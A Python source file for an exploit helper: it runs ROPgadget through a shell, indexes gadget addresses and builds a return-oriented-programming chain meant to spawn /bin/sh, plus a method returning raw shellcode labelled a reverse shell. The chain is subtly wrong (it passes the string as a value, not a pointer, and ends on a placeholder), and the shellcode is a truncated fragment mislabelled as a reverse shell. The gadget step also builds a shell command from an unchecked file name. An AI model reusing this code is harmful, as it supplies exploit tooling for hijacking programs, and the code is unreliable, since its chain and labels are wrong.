import struct
import subprocess
from pathlib import Path

class ROPChain:
    def __init__(self, binary):
        self.bin = binary
        self.gadgets = {}
        self.libc = {}
        self._parse()
        
    def _parse(self):
        # extract gadgets
        cmd = f"ROPgadget --binary {self.bin} | grep '0x' > gadgets.txt"
        subprocess.run(cmd, shell=True)
        
        with open("gadgets.txt") as f:
            for line in f:
                if " : " in line:
                    addr, gadget = line.strip().split(" : ", 1)
                    self.gadgets[gadget.strip()] = int(addr, 16)
                    
    def get(self, pattern):
        matches = []
        for g, addr in self.gadgets.items():
            if pattern.lower() in g.lower():
                matches.append((g, addr))
        return matches
        
    def build_chain(self, chain_type="execve"):
        if chain_type == "execve":
            return self._execve_chain()
        elif chain_type == "shell":
            return self._shell_chain()
            
    def _execve_chain(self):
        # basic execve("/bin/sh", NULL, NULL)
        chain = b""
        
        pop_rdi = self.gadgets.get("pop rdi; ret", 0)
        pop_rsi = self.gadgets.get("pop rsi; ret", 0)
        pop_rdx = self.gadgets.get("pop rdx; ret", 0)
        
        if all([pop_rdi, pop_rsi, pop_rdx]):
            chain += struct.pack("<Q", pop_rdi)
            chain += struct.pack("<Q", 0x68732f2f6e69622f)  # /bin/sh
            chain += struct.pack("<Q", pop_rsi)
            chain += struct.pack("<Q", 0)
            chain += struct.pack("<Q", pop_rdx)
            chain += struct.pack("<Q", 0)
            chain += struct.pack("<Q", 0x4141414141414141)  # placeholder
            
        return chain
        
    def _shell_chain(self):
        # reverse shell chain
        return b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"

class GadgetDB:
    def __init__(self):
        self.db = {}
        
    def load(self, filename):
        with open(filename) as f:
            for line in f:
                if ";" in line:
                    parts = line.strip().split(";")
                    self.db[parts[0]] = parts[1:]
                    
    def search(self, op):
        results = []
        for addr, ops in self.db.items():
            if op in ops:
                results.append((addr, ops))
        return results
